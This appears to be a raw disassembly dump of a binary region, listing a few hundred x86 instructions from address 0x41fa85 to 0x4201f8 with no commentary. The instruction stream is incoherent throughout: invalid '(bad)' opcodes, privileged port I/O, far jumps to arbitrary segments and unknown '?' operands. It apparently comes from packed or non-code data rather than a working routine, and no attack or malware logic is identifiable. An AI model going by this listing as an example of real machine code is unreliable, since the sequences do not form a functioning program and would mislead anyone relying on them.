  41fa85:	mov    ch,0xd8
  41fa87:	not    DWORD PTR [ebx+0x10]
  41fa8a:	shl    BYTE PTR [edi+0x15fdf97c],0x23
  41fa91:	in     al,0xbd
  41fa93:	out    dx,eax
  41fa94:	mov    dl,0x8c
  41fa96:	inc    ecx
  41fa97:	sbb    BYTE PTR [edi],bh
  41fa99:	leave  
  41fa9a:	out    0xe9,eax
  41fa9c:	dec    edi
  41fa9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa9e:	lods   al,BYTE PTR ds:[esi]
  41fa9f:	and    DWORD PTR [ecx+eax*2-0x66555e41],0xffffffdd
  41faa7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41faa8:	cli    
  41faa9:	push   ecx
  41faaa:	mov    esi,0x56a3e1ed
  41faaf:	jmp    0xf6c8090
  41fab4:	or     DWORD PTR ss:[ecx],eax
  41fab7:	xchg   BYTE PTR [ebp+0x58],ah
  41faba:	repz adc eax,0x719b7d6e
  41fac0:	fistp  WORD PTR [edi+0x18db85d4]
  41fac6:	dec    esi
  41fac7:	stc    
  41fac8:	(bad)  
  41faca:	fsub   DWORD PTR [ebp+0x4]
  41facd:	in     al,dx
  41face:	sbb    BYTE PTR [edx],cl
  41fad0:	mov    ebx,0xf50b7071
  41fad5:	idiv   DWORD PTR [edi]
  41fad7:	out    0xf7,eax
  41fad9:	xchg   DWORD PTR [edx+0xc],eax
  41fadc:	dec    esi
  41fadd:	cdq    
  41fade:	mov    WORD PTR [edx-0x66],cs
  41fae1:	paddusw mm0,QWORD PTR [ecx+ebp*2-0x49d2b58c]
  41fae9:	xor    BYTE PTR [eax+0x4a],bl
  41faec:	dec    edx
  41faed:	push   edi
  41faee:	pop    edx
  41faef:	push   edi
  41faf0:	pop    ebp
  41faf1:	dec    edi
  41faf2:	mov    dh,0x0
  41faf4:	dec    edx
  41faf5:	push   ecx
  41faf6:	(bad)  
  41faf7:	cmp    eax,0x8a609ac4
  41fafc:	add    DWORD PTR [eax],eax
  41fafe:	mov    BYTE PTR [esi],al
  41fb00:	add    BYTE PTR [eax],al
  41fb02:	xchg   DWORD PTR [eax],edx
  41fb04:	ret    
  41fb05:	inc    edi
  41fb06:	pop    esp
  41fb07:	in     eax,0x83
  41fb09:	test   BYTE PTR [edx-0x7d],dh
  41fb0c:	imul   ebx,eax,0x2c6698f4
  41fb12:	jmp    0x41faa1
  41fb14:	sbb    BYTE PTR [ebx],0xf1
  41fb17:	test   DWORD PTR ds:0xc93698e,esp
  41fb1d:	cwde   
  41fb1e:	jg     0x41fb32
  41fb20:	or     al,0xe
  41fb22:	lahf   
  41fb23:	mov    DWORD PTR [esi+0x280224c4],ecx
  41fb29:	pop    eax
  41fb2a:	retf   0xed9e
  41fb2d:	inc    ecx
  41fb2e:	(bad)  
  41fb2f:	lock pop esp
  41fb31:	push   edi
  41fb32:	mov    ebx,0xb60e72e9
  41fb37:	pop    ecx
  41fb38:	adc    ch,BYTE PTR [eax+0x525e065e]
  41fb3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb3f:	mov    ds:0x68dc9d1,eax
  41fb44:	sub    esp,edx
  41fb46:	retf   
  41fb47:	repz sbb BYTE PTR [ecx+0x1c143cb7],dl
  41fb4e:	iret   
  41fb4f:	test   al,0xb8
  41fb51:	rcl    edx,1
  41fb53:	mov    ecx,0x70b480a
  41fb58:	adc    eax,0x89a4b5f6
  41fb5d:	xchg   edx,eax
  41fb5e:	in     eax,dx
  41fb5f:	and    ah,0x5f
  41fb62:	mov    edx,0x912a0a6
  41fb67:	pop    ss
  41fb68:	imul   esi,DWORD PTR [ebx+0x2661da0],0x1e
  41fb6f:	dec    edx
  41fb70:	inc    esi
  41fb71:	pop    ss
  41fb72:	pop    ecx
  41fb73:	(bad)  [ecx-0x50]
  41fb76:	enter  0xc8e2,0xa2
  41fb7a:	shr    DWORD PTR [ecx+0x28cc6fd2],1
  41fb80:	jecxz  0x41fb43
  41fb82:	mov    edi,0xcd3c9ee6
  41fb87:	loop   0x41fbee
  41fb89:	and    bh,BYTE PTR [eax]
  41fb8b:	sbb    eax,0x2db3f733
  41fb90:	sbb    ch,BYTE PTR ds:0x103f31b2
  41fb96:	jbe    0x41fbad
  41fb98:	(bad)  [eax]
  41fb9a:	cmc    
  41fb9b:	inc    ebp
  41fb9c:	jne    0x41fbeb
  41fb9e:	in     eax,dx
  41fb9f:	xor    ecx,0xc4ad9c96
  41fba5:	outs   dx,DWORD PTR ds:[esi]
  41fba6:	fnstenv [edi]
  41fba8:	jno    0x41fb68
  41fbaa:	scas   al,BYTE PTR es:[edi]
  41fbab:	clc    
  41fbac:	xchg   esi,eax
  41fbad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fbae:	or     eax,0x5b8edbe3
  41fbb3:	int3   
  41fbb4:	lods   eax,DWORD PTR ds:[esi]
  41fbb5:	inc    edi
  41fbb7:	(bad)  
  41fbb9:	mov    ds:0x10cc982f,al
  41fbbe:	test   al,0x88
  41fbc0:	sub    DWORD PTR [esi+edi*8-0x11],edi
  41fbc4:	aam    0xdd
  41fbc6:	adc    cl,dl
  41fbc8:	mov    WORD PTR [esi-0x385456e2],fs
  41fbce:	hlt    
  41fbcf:	test   BYTE PTR [esi+esi*8+0x6c],bh
  41fbd3:	jmp    0x41fc44
  41fbd5:	sub    eax,0x288a3e2d
  41fbda:	or     BYTE PTR [eax+0xa],al
  41fbdd:	mov    ecx,0x9a0d822b
  41fbe2:	adc    DWORD PTR [edi-0x1b],0x51a3aa9a
  41fbe9:	jb     0x41fb95
  41fbeb:	dec    edi
  41fbec:	dec    ebx
  41fbed:	leave  
  41fbee:	xchg   edx,eax
  41fbef:	jp     0x41fc12
  41fbf1:	push   ecx
  41fbf2:	in     al,0x9c
  41fbf4:	inc    ebp
  41fbf5:	cmp    ebx,esi
  41fbf7:	inc    ebx
  41fbf8:	test   ebp,esi
  41fbfa:	aas    
  41fbfb:	popa   
  41fbfc:	sbb    eax,0x52759d8a
  41fc01:	test   bh,cl
  41fc03:	sbb    al,0xf1
  41fc05:	jmp    0xb7fb2474
  41fc0a:	call   0x2421:0xac460ba5
  41fc11:	lea    esp,[esi-0x6ae96d7c]
  41fc17:	mov    ah,BYTE PTR [ebx-0x3b6f25f8]
  41fc1d:	stc    
  41fc1e:	rcl    BYTE PTR [ebp-0x61],1
  41fc21:	mov    ebp,DWORD PTR [eax-0x707e8064]
  41fc27:	cmp    eax,0x14d6a50
  41fc2c:	loope  0x41fc4b
  41fc2e:	add    dh,BYTE PTR [esi+0x5d018ac5]
  41fc34:	push   edi
  41fc35:	cmp    BYTE PTR [edx],cl
  41fc37:	cld    
  41fc38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc39:	jb     0x41fc4a
  41fc3b:	xchg   edi,eax
  41fc3c:	inc    eax
  41fc3d:	test   DWORD PTR [eax-0x5af50e8d],eax
  41fc43:	jae    0x41fcb0
  41fc45:	pop    esp
  41fc46:	adc    eax,0xe3d9553
  41fc4b:	xlat   BYTE PTR ds:[ebx]
  41fc4c:	leave  
  41fc4d:	ret    
  41fc4e:	jnp    0x41fc73
  41fc50:	cdq    
  41fc51:	cld    
  41fc52:	sub    ch,BYTE PTR [edx+0x3a]
  41fc55:	push   es
  41fc56:	sbb    ecx,DWORD PTR ds:0xb5a42800
  41fc5c:	cmp    bl,dh
  41fc5e:	sbb    al,BYTE PTR [ecx]
  41fc60:	mov    ah,0x9a
  41fc62:	dec    ecx
  41fc63:	adc    BYTE PTR [eax+ebx*8-0x6909024e],0x4b
  41fc6b:	push   0x4123c71e
  41fc70:	int    0xec
  41fc72:	data16 mov ds:0x51885186,al
  41fc78:	mov    WORD PTR [edi+0x54],?
  41fc7b:	push   es
  41fc7c:	cmp    al,0x9
  41fc7e:	(bad)  
  41fc80:	or     ebx,edi
  41fc82:	popf   
  41fc83:	jno    0x41fc5e
  41fc85:	and    eax,0x83f9e44e
  41fc8a:	aaa    
  41fc8b:	loope  0x41fc86
  41fc8d:	jae    0x41fc7b
  41fc8f:	cmp    al,BYTE PTR [edx+0x4f]
  41fc92:	mov    al,ds:0xa7bbbddc
  41fc97:	popf   
  41fc98:	push   edx
  41fc99:	fld    DWORD PTR [ecx-0x16b5c2de]
  41fc9f:	and    DWORD PTR [eax-0x3c0a601f],ecx
  41fca5:	cmp    BYTE PTR [edx-0x6],dh
  41fca8:	sahf   
  41fca9:	call   0xa2c7873d
  41fcae:	aas    
  41fcaf:	aam    0x58
  41fcb1:	mov    ch,BYTE PTR [eax]
  41fcb3:	add    eax,0x623e462
  41fcb8:	mul    BYTE PTR [esi+0x48]
  41fcbb:	sbb    edx,ebp
  41fcbd:	lahf   
  41fcbe:	pusha  
  41fcbf:	stos   DWORD PTR es:[edi],eax
  41fcc0:	sbb    BYTE PTR [ecx+0x9487de2],0x9c
  41fcc7:	or     eax,0xc4b8b48a
  41fccc:	mov    esi,0xdc6c99f8
  41fcd1:	add    cl,ah
  41fcd3:	shl    BYTE PTR [ebx],cl
  41fcd5:	push   esp
  41fcd6:	add    al,0x3d
  41fcd8:	mov    al,0x5f
  41fcda:	jmp    0x2cc0:0xf513a942
  41fce1:	enter  0x888d,0x8f
  41fce5:	call   0x33331c6a
  41fcea:	sahf   
  41fceb:	pop    es
  41fcec:	shl    DWORD PTR [ebp-0x47],cl
  41fcef:	in     al,0x2b
  41fcf1:	leave  
  41fcf2:	inc    ebp
  41fcf3:	mov    al,0xfe
  41fcf5:	enter  0xe66b,0x5c
  41fcf9:	mov    dl,0xe1
  41fcfb:	outs   dx,BYTE PTR ds:[esi]
  41fcfc:	lahf   
  41fcfd:	iret   
  41fcfe:	jle    0x41fd44
  41fd00:	mov    DWORD PTR [edi+0x2b],esp
  41fd03:	inc    esi
  41fd04:	sbb    eax,0x34b73a48
  41fd09:	push   edx
  41fd0a:	lods   eax,DWORD PTR ds:[esi]
  41fd0b:	out    dx,al
  41fd0c:	push   edi
  41fd0d:	jb     0x41fcd3
  41fd0f:	pusha  
  41fd10:	xor    ecx,ecx
  41fd12:	jb     0x41fcff
  41fd14:	and    BYTE PTR [ebp-0x65],dh
  41fd17:	xchg   edx,eax
  41fd18:	fmul   QWORD PTR [edx]
  41fd1a:	sbb    eax,0xfbf9bb95
  41fd1f:	mov    al,ds:0x27268a7c
  41fd24:	lods   al,BYTE PTR ds:[esi]
  41fd25:	mov    ds:0x1b9d428b,al
  41fd2a:	and    al,0x13
  41fd2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd2d:	enter  0x9444,0xc8
  41fd31:	cmp    DWORD PTR [edx-0x7d59f8b0],ecx
  41fd37:	xchg   BYTE PTR [ecx],ch
  41fd39:	and    esp,DWORD PTR [esi+0x1a]
  41fd3c:	and    BYTE PTR [ebx+ebp*1],0x77
  41fd40:	and    BYTE PTR [ebp+0xa],cl
  41fd43:	stc    
  41fd44:	push   ds
  41fd45:	call   0xa0d9:0xbfed4e47
  41fd4c:	add    BYTE PTR [esi+0x2971c727],dh
  41fd52:	shl    BYTE PTR [edi+0x220ec815],0x79
  41fd59:	or     esp,DWORD PTR [ecx-0x2e0956d6]
  41fd5f:	inc    ecx
  41fd60:	pop    ecx
  41fd61:	push   0xffffffb5
  41fd63:	adc    BYTE PTR [ebx+0x8],ah
  41fd66:	popf   
  41fd67:	iret   
  41fd68:	sbb    BYTE PTR ds:0xc3ac4edb,dh
  41fd6e:	cli    
  41fd6f:	xchg   ebp,eax
  41fd70:	cmp    BYTE PTR [edx],bh
  41fd72:	add    al,0x54
  41fd74:	sub    BYTE PTR [edi-0x371baef9],0x55
  41fd7b:	jp     0x41fd5e
  41fd7d:	mov    dl,0x88
  41fd7f:	fstp   st(7)
  41fd81:	gs (bad) 
  41fd83:	sbb    eax,0xe76d0f58
  41fd88:	and    al,0x72
  41fd8a:	mov    dl,0x7c
  41fd8c:	inc    eax
  41fd8d:	sbb    BYTE PTR [esi],dh
  41fd8f:	dec    esi
  41fd90:	scas   eax,DWORD PTR es:[edi]
  41fd91:	xchg   ebx,eax
  41fd92:	adc    al,0xa8
  41fd94:	daa    
  41fd95:	xor    al,0x85
  41fd97:	and    BYTE PTR [ebx],bh
  41fd99:	sub    esi,edi
  41fd9b:	fs jp  0x41fdc7
  41fd9e:	mov    ebp,?
  41fda0:	stos   BYTE PTR es:[edi],al
  41fda1:	dec    ecx
  41fda2:	inc    edi
  41fda3:	push   0xfffffffd
  41fda5:	dec    ebx
  41fda6:	pusha  
  41fda7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fda8:	mov    dl,0xa
  41fdaa:	inc    ebp
  41fdab:	scas   al,BYTE PTR es:[edi]
  41fdac:	add    al,0xd6
  41fdae:	mov    bl,0x5b
  41fdb0:	adc    edx,DWORD PTR [ebp-0x60aa4ad2]
  41fdb6:	mov    edi,0x3711a2cb
  41fdbb:	loop   0x41fe1e
  41fdbd:	iret   
  41fdbe:	mov    dh,al
  41fdc0:	(bad)
  41fdc3:	mov    ds:0xa616cd2d,al
  41fdc8:	or     BYTE PTR [esi-0x27],0x3a
  41fdcc:	aaa    
  41fdcd:	outs   dx,BYTE PTR ds:[esi]
  41fdce:	push   ecx
  41fdcf:	inc    esi
  41fdd0:	push   edx
  41fdd1:	int    0xc7
  41fdd3:	aaa    
  41fdd4:	or     eax,0x85cc3da6
  41fdd9:	and    eax,0x63ba9f1a
  41fdde:	shl    dl,1
  41fde0:	mov    ecx,edi
  41fde2:	test   DWORD PTR [esi+esi*1+0x7433057d],ecx
  41fde9:	loopne 0x41fdac
  41fdeb:	sub    dl,bl
  41fded:	adc    ecx,DWORD PTR [ecx+eiz*8-0x4338dec7]
  41fdf4:	xchg   ebp,eax
  41fdf5:	xor    DWORD PTR [esi+0x6f51982c],esp
  41fdfb:	popa   
  41fdfc:	iret   
  41fdfd:	or     BYTE PTR [ebp+0x7f],0x59
  41fe01:	adc    BYTE PTR [ebp+0x4b9dd6be],al
  41fe07:	adc    BYTE PTR [edx+0x27],bh
  41fe0a:	call   0xdc6e696d
  41fe0f:	dec    esp
  41fe10:	xor    DWORD PTR [eax-0x1],edi
  41fe13:	leave  
  41fe14:	arpl   WORD PTR [ebx-0x2e6de998],cx
  41fe1a:	cdq    
  41fe1b:	pop    edx
  41fe1c:	cli    
  41fe1d:	out    dx,al
  41fe1e:	push   0x7e
  41fe20:	or     eax,0x6eed07bb
  41fe25:	push   ecx
  41fe26:	sbb    ebx,esi
  41fe28:	and    al,0x9f
  41fe2a:	and    edx,DWORD PTR [edi+eiz*2]
  41fe2d:	xchg   edi,eax
  41fe2e:	dec    esp
  41fe2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe30:	add    BYTE PTR [edx+0x54e4c14d],bh
  41fe36:	hlt    
  41fe37:	mov    ch,0x85
  41fe39:	or     bh,bh
  41fe3b:	xchg   edi,eax
  41fe3c:	and    BYTE PTR [ebx+0x7ee6c306],ah
  41fe42:	mov    ebx,0x78169bf2
  41fe47:	mov    edi,0xecd2ea94
  41fe4c:	dec    edx
  41fe4d:	pop    eax
  41fe4e:	les    ebp,FWORD PTR [esi]
  41fe50:	adc    BYTE PTR [edx+0x5b8697d6],0x4b
  41fe57:	inc    esi
  41fe58:	sub    esp,DWORD PTR [esi]
  41fe5a:	lock push edi
  41fe5c:	out    dx,al
  41fe5d:	push   edx
  41fe5e:	add    al,0x43
  41fe60:	les    ebp,FWORD PTR [ecx-0x5f]
  41fe63:	ins    BYTE PTR es:[edi],dx
  41fe64:	int    0x41
  41fe66:	cmc    
  41fe67:	loop   0x41fe9f
  41fe69:	and    al,0x37
  41fe6b:	aad    0xa
  41fe6d:	jmp    0x41fdfb
  41fe6f:	cmp    edx,ebp
  41fe71:	xor    DWORD PTR [ebp+0x61],0x28
  41fe75:	arpl   WORD PTR [ebp+0x149234d1],ax
  41fe7b:	fmul   QWORD PTR [ebx]
  41fe7d:	jbe    0x41fe43
  41fe7f:	repnz adc al,0x4b
  41fe82:	(bad)  
  41fe83:	sar    DWORD PTR [eax-0x2a5e8669],0xfd
  41fe8a:	je     0x41fee2
  41fe8c:	sub    al,0x71
  41fe8e:	adc    ebx,DWORD PTR [ebx-0x6041d653]
  41fe94:	imul   eax,DWORD PTR [ebp-0x6ea7c932],0x79be3feb
  41fe9e:	mul    dh
  41fea0:	stc    
  41fea1:	enter  0x942c,0x67
  41fea5:	sti    
  41fea6:	lahf   
  41fea7:	mov    bl,0x8e
  41fea9:	push   esi
  41feaa:	aam    0x15
  41feac:	mov    cl,0x24
  41feae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41feaf:	lahf   
  41feb0:	rcl    BYTE PTR [ebx-0x5d00e193],1
  41feb6:	ret    
  41feb7:	and    al,0x1d
  41feb9:	and    dl,BYTE PTR [edx+edi*2+0x2268681c]
  41fec0:	je     0x41ff35
  41fec2:	cmc    
  41fec3:	sub    dl,al
  41fec5:	add    dl,bl
  41fec7:	aad    0x20
  41fec9:	shl    BYTE PTR [ecx-0x6d],0xb8
  41fecd:	pop    edx
  41fece:	mov    dl,0xa0
  41fed0:	push   cs
  41fed1:	aam    0x5
  41fed3:	out    dx,eax
  41fed4:	dec    ecx
  41fed5:	lods   eax,DWORD PTR ds:[esi]
  41fed6:	xchg   ebx,eax
  41fed7:	jb     0x41fe80
  41fed9:	mov    DWORD PTR [esi],edx
  41fedb:	and    eax,0xbe6e16d5
  41fee0:	adc    DWORD PTR [ecx+0x42],eax
  41fee3:	adc    eax,0xfbb790ca
  41fee8:	mov    ecx,0xf8fa0f3
  41feed:	scas   eax,DWORD PTR es:[edi]
  41feee:	pop    ecx
  41feef:	in     al,dx
  41fef0:	and    BYTE PTR [edi+0x7],bl
  41fef3:	ds pop ebp
  41fef5:	xchg   BYTE PTR [eax+edi*4+0x34c68d37],bh
  41fefc:	into   
  41fefd:	std    
  41fefe:	mov    edx,?
  41ff00:	ja     0x41ff62
  41ff02:	inc    ebp
  41ff03:	push   ecx
  41ff04:	imul   edi,DWORD PTR [edi+esi*4],0x5a44f70e
  41ff0b:	stc    
  41ff0c:	cmp    cl,0x9f
  41ff0f:	jg     0x41ff54
  41ff11:	outs   dx,BYTE PTR ds:[esi]
  41ff12:	sub    al,0x29
  41ff14:	ficomp DWORD PTR [esi-0x12e2e9cd]
  41ff1a:	mov    edi,0x78e4c8d8
  41ff1f:	mov    eax,0x9b947103
  41ff24:	and    al,0x77
  41ff26:	inc    ebx
  41ff27:	cmp    bh,bl
  41ff29:	sti    
  41ff2a:	dec    BYTE PTR [edi]
  41ff2c:	shr    BYTE PTR [ebx],1
  41ff2e:	dec    eax
  41ff2f:	test   eax,0xfaa9d39a
  41ff34:	lods   al,BYTE PTR ds:[esi]
  41ff35:	pop    esi
  41ff36:	test   BYTE PTR ss:[esi+ebx*8],ch
  41ff3a:	neg    DWORD PTR [ecx+0x57]
  41ff3d:	dec    esi
  41ff3e:	repnz xlat BYTE PTR ds:[ebx]
  41ff40:	mov    edx,0xe1dfa698
  41ff45:	(bad)  
  41ff46:	push   edi
  41ff47:	sbb    BYTE PTR [edx-0x7b],bl
  41ff4a:	mov    eax,ds:0x1fb6cdf
  41ff4f:	out    0x50,al
  41ff51:	push   cs
  41ff52:	call   0x6905fc9
  41ff57:	mov    bh,0x3d
  41ff59:	loop   0x41ff96
  41ff5b:	push   0x18ac9027
  41ff60:	push   esi
  41ff61:	shl    BYTE PTR [ebx+0x44],cl
  41ff64:	mov    esi,0x74c18933
  41ff69:	loope  0x41ff5e
  41ff6b:	xchg   DWORD PTR [esi],ebx
  41ff6d:	sbb    BYTE PTR [edi-0xf],dl
  41ff70:	shr    DWORD PTR [ebx],0x48
  41ff73:	fisub  DWORD PTR [edx+0x3f]
  41ff76:	jle    0x41ff41
  41ff78:	sub    ecx,DWORD PTR [ecx+eiz*4+0x4fede17c]
  41ff7f:	int    0xea
  41ff81:	out    0xf9,eax
  41ff83:	pop    ebx
  41ff84:	jmp    0x8c3d45a8
  41ff89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff8a:	xor    BYTE PTR [ebx-0x41],0xee
  41ff8e:	shr    ebx,cl
  41ff90:	xchg   ecx,eax
  41ff91:	std    
  41ff92:	test   BYTE PTR [esi+0x9],ch
  41ff95:	sbb    ebx,DWORD PTR [ebp+0x75873b18]
  41ff9b:	mov    edx,0xc1ee0b16
  41ffa0:	jecxz  0x41ffbb
  41ffa2:	shr    DWORD PTR [edi+0x40],0x13
  41ffa6:	into   
  41ffa7:	mov    cl,0x4a
  41ffa9:	sahf   
  41ffaa:	gs clc 
  41ffac:	clc    
  41ffad:	outs   dx,DWORD PTR ds:[esi]
  41ffae:	loope  0x41ff51
  41ffb0:	mov    ch,0x63
  41ffb2:	ja     0x41ff49
  41ffb4:	mov    edi,0x76ea2901
  41ffb9:	sbb    eax,0x2528a790
  41ffbe:	jecxz  0x41ff4e
  41ffc0:	loop   0x420027
  41ffc2:	jb     0x41ffc4
  41ffc4:	adc    ch,BYTE PTR ds:[ecx]
  41ffc7:	inc    ebp
  41ffc8:	mov    ebp,0xa14bbb3c
  41ffcd:	mov    edi,0x3f85650f
  41ffd2:	sbb    dh,BYTE PTR [ebp-0x14]
  41ffd5:	jecxz  0x41ff6f
  41ffd7:	and    bl,BYTE PTR [esi-0x22c3962]
  41ffdd:	and    eax,0xbdddbfc2
  41ffe2:	cdq    
  41ffe3:	sub    BYTE PTR [edi+eiz*2+0x20],al
  41ffe7:	sar    DWORD PTR [edx+0x597d7fd2],cl
  41ffed:	push   edi
  41ffee:	sbb    eax,DWORD PTR [ebx+0x72]
  41fff1:	sub    al,BYTE PTR [edx-0x79]
  41fff4:	fwait
  41fff5:	pushf  
  41fff6:	inc    ebx
  41fff7:	xchg   esp,eax
  41fff8:	mov    dl,0x80
  41fffa:	xchg   esi,eax
  41fffb:	dec    ebp
  41fffc:	sub    ebp,edi
  41fffe:	jne    0x420028
  420000:	popf   
  420001:	lock mov ch,0x4
  420004:	mov    ecx,0xb9f88d57
  420009:	xchg   esi,eax
  42000a:	jp     0x420020
  42000c:	imul   ebp,DWORD PTR [ebx-0x34],0xffffffc1
  420010:	or     dl,bl
  420012:	mov    BYTE PTR es:[edx],dh
  420015:	iret   
  420016:	int    0x7d
  420018:	(bad)  
  420019:	jmp    0x911bed5c
  42001e:	cmp    al,0xf7
  420020:	sub    al,0xcc
  420022:	xchg   ecx,eax
  420023:	scas   al,BYTE PTR es:[edi]
  420024:	add    al,0xb3
  420026:	jbe    0x41ffbf
  420028:	jmp    0x334:0x25ba11d5
  42002f:	aad    0xc8
  420031:	icebp  
  420032:	fs and al,0x76
  420035:	cmp    edi,DWORD PTR [eax+0x268cc5f0]
  42003b:	ret    0x391d
  42003e:	pop    ebp
  42003f:	push   ebx
  420040:	fcomp  QWORD PTR [eax-0x32]
  420043:	xchg   BYTE PTR [eax+0x394f0498],ah
  420049:	hlt    
  42004a:	out    dx,eax
  42004b:	pusha  
  42004c:	and    ch,0x87
  42004f:	test   DWORD PTR ds:0xc5e89661,0x230616b7
  420059:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42005a:	test   esi,ecx
  42005c:	cmp    al,0x30
  42005e:	test   DWORD PTR [ebx],edx
  420060:	into   
  420061:	lods   eax,DWORD PTR ds:[esi]
  420062:	sbb    eax,0x5bc0869b
  420067:	iret   
  420068:	loopne 0x42000b
  42006a:	mov    ch,0xd9
  42006c:	adc    eax,0x51abd353
  420071:	dec    edi
  420072:	mov    edx,0xcdc714a8
  420077:	stos   BYTE PTR es:[edi],al
  420078:	inc    edi
  420079:	inc    ebx
  42007a:	and    BYTE PTR [esp+ebp*4-0x70ce6d45],ch
  420081:	ret    0x7fb8
  420084:	arpl   si,sp
  420086:	idiv   DWORD PTR [eax]
  420088:	fwait
  420089:	inc    edi
  42008a:	and    al,0x7d
  42008c:	mov    al,0xbb
  42008e:	fcom   QWORD PTR [ebp+0x3e]
  420091:	mov    esi,cs
  420093:	cmp    DWORD PTR [ebx],edi
  420095:	add    ecx,ebx
  420097:	in     al,dx
  420098:	inc    eax
  420099:	in     eax,0xce
  42009b:	cmp    BYTE PTR [edi-0x7b],dl
  42009e:	aas    
  42009f:	adc    edx,DWORD PTR [esi+0x40]
  4200a2:	push   ss
  4200a3:	(bad)  
  4200a5:	cs mov ebp,0xeee780cd
  4200ab:	std    
  4200ac:	mov    ah,0x73
  4200ae:	mov    bl,0x33
  4200b0:	mov    cl,BYTE PTR [esi]
  4200b2:	dec    ebp
  4200b3:	push   ecx
  4200b4:	push   eax
  4200b5:	xchg   edi,eax
  4200b6:	into   
  4200b7:	dec    DWORD PTR [edx-0x11]
  4200ba:	(bad)  
  4200bb:	in     al,dx
  4200bc:	cld    
  4200bd:	mov    eax,0x2e7bc493
  4200c2:	jg     0x420051
  4200c4:	sub    esp,DWORD PTR [ecx]
  4200c6:	push   edi
  4200c7:	sub    ah,BYTE PTR [ecx+0xdbdb763]
  4200cd:	out    0xab,al
  4200cf:	stos   DWORD PTR es:[edi],eax
  4200d0:	add    DWORD PTR [eax-0x48b479f2],edx
  4200d6:	lds    esi,FWORD PTR [esi]
  4200d8:	jmp    0xcf4e1a85
  4200dd:	cmp    BYTE PTR [ebx],ah
  4200df:	ins    BYTE PTR es:[edi],dx
  4200e0:	cmp    dl,0x8c
  4200e3:	add    al,BYTE PTR [ebx+edx*4+0x6f6c2606]
  4200ea:	push   ss
  4200eb:	xchg   DWORD PTR [ecx],ebx
  4200ed:	or     eax,0xd1909fc8
  4200f2:	dec    ecx
  4200f3:	outs   dx,BYTE PTR ds:[esi]
  4200f4:	xor    al,0xa0
  4200f6:	mov    esp,0xda70488
  4200fb:	mov    WORD PTR [ebp+0x756ea068],?
  420101:	fidivr WORD PTR [edx-0x79]
  420104:	mov    edi,0xdf528a22
  420109:	pop    es
  42010a:	mov    dh,dl
  42010c:	pop    ebx
  42010d:	push   ss
  42010e:	push   ss
  42010f:	mov    ss,WORD PTR [edx]
  420111:	xor    al,0x77
  420113:	(bad)  
  420114:	dec    ebx
  420115:	lahf   
  420116:	mov    ebp,0x4e0bb035
  42011b:	aad    0x77
  42011d:	(bad)  
  42011e:	jg     0x42012b
  420120:	sbb    eax,0x51141d04
  420125:	mov    cl,0x74
  420127:	adc    bl,BYTE PTR [ecx+0x72]
  42012a:	rcl    DWORD PTR [ecx-0x18],cl
  42012d:	push   edx
  42012e:	sbb    eax,DWORD PTR [ebp+0x2f]
  420131:	dec    ebx
  420132:	push   ebp
  420133:	cld    
  420134:	repz xor eax,0x7085a49d
  42013a:	pushw  0x29
  42013d:	fmul   DWORD PTR [esi+0x7b055973]
  420143:	cld    
  420144:	push   ebx
  420145:	push   cs
  420146:	add    DWORD PTR [ecx+0x3b],ebp
  420149:	mov    eax,ds:0x8d2236fa
  42014e:	retf   
  42014f:	add    eax,0xec04efbd
  420154:	jg     0x4200dd
  420156:	pusha  
  420157:	add    BYTE PTR [ebx+0x5c4ab146],dl
  42015d:	(bad)  
  42015e:	pop    ecx
  42015f:	mov    WORD PTR [edx+0x1dc0aa7c],fs
  420165:	xchg   ebp,eax
  420166:	sar    ecx,1
  420168:	sub    al,0x1
  42016a:	retf   
  42016b:	xor    BYTE PTR [ecx],bh
  42016d:	dec    ebp
  42016e:	adc    eax,0x160a54a3
  420173:	sbb    BYTE PTR [ebx+0x53c8ddd4],ch
  420179:	inc    ecx
  42017a:	pop    ds
  42017b:	in     eax,dx
  42017c:	cmp    al,0x1
  42017e:	jns    0x4201f3
  420180:	push   ebp
  420181:	popf   
  420182:	pop    edi
  420183:	stc    
  420184:	hlt    
  420185:	aas    
  420186:	in     eax,dx
  420187:	mov    edi,0x57593fda
  42018c:	inc    ecx
  42018d:	dec    ebx
  42018e:	dec    edi
  42018f:	pop    edi
  420190:	pop    ebx
  420191:	push   edi
  420192:	sub    al,0x52
  420194:	xchg   DWORD PTR [ebx+0x51],esi
  420197:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420198:	adc    DWORD PTR [edx-0x18],esp
  42019b:	nop
  42019c:	add    DWORD PTR [eax],eax
  42019e:	mov    BYTE PTR [esi],al
  4201a0:	add    BYTE PTR [eax],al
  4201a2:	push   esp
  4201a3:	popa   
  4201a4:	popa   
  4201a5:	xchg   esp,eax
  4201a6:	cmp    esp,0x6f
  4201a9:	jne    0x420130
  4201ab:	xchg   BYTE PTR [ebx-0x4b064064],dh
  4201b1:	out    0xde,al
  4201b3:	jbe    0x420147
  4201b5:	sar    dl,0x6f
  4201b8:	inc    eax
  4201b9:	adc    BYTE PTR [ebp-0x3f],0xe8
  4201bd:	icebp  
  4201be:	iret   
  4201bf:	icebp  
  4201c0:	jmp    0x304956ff
  4201c5:	cmp    BYTE PTR [ecx],dl
  4201c7:	sti    
  4201c8:	dec    esp
  4201ca:	xor    al,0x70
  4201cc:	rol    eax,0xe3
  4201cf:	push   eax
  4201d0:	stos   BYTE PTR es:[edi],al
  4201d1:	jbe    0x420244
  4201d3:	repz mov al,0x69
  4201d6:	retf   
  4201d7:	inc    edi
  4201d8:	adc    dh,BYTE PTR [eax*2-0x562ae7b1]
  4201df:	fistp  DWORD PTR ds:0xafcf1fdc
  4201e5:	push   es
  4201e6:	ret    
  4201e7:	cmp    BYTE PTR [esi],bl
  4201e9:	cmp    al,0xee
  4201eb:	inc    eax
  4201ec:	mov    eax,ds:0x52b6468c
  4201f1:	scas   al,BYTE PTR es:[edi]
  4201f2:	sti    
  4201f3:	fsubr  QWORD PTR [ebp+0x69]
  4201f6:	ds inc esi
  4201f8:	loopne 0x420220
